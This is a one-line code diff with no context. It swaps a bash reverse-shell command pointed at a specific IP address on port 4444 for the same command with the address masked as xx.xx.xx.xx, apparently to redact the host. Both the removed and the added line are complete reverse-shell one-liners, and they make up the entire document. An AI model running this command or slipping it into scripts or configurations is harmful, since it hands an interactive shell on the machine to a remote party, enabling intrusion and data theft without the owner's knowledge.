@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/112.126.82.114/4444 0>&1
+bash -i >& /dev/tcp/xx.xx.xx.xx/4444 0>&1
